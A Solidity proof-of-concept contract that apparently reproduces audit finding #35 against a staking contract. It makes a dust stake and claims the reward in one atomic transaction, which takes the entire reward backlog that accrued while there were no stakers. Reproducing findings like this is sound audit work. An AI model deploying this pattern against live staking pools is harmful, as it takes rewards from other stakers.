// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

/*
 * Campaign-only attacker for the #35 reproduction - a new file, src/ untouched.
 *
 * The finding was a COMPOSITION of legitimate calls: with a reward backlog
 * sitting at zero stakers, a dust stake followed immediately by a claim, all
 * inside ONE transaction, captured the whole backlog. Reproducing it honestly
 * requires atomicity, which is what this contract provides.
 */
interface ICampaignDmn {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}
interface ICampaignStaking {
    function stake(uint256 amount, uint256 lockOptionIndex) external returns (uint256);
    function claimReward() external;
    function pendingReward(address user) external view returns (uint256);
}

contract CampaignAttacker {
    uint256 public lastGain;
    uint256 public pendingSeen;

    /// Dust stake + claim, atomically, exactly as the finding described.
    function dustStakeAndClaim(address token, address staking, uint256 amount) external {
        uint256 before = address(this).balance;
        ICampaignDmn(token).approve(staking, amount);
        ICampaignStaking(staking).stake(amount, 0);
        pendingSeen = ICampaignStaking(staking).pendingReward(address(this));
        ICampaignStaking(staking).claimReward();
        lastGain = address(this).balance - before;
    }

    receive() external payable {}
}
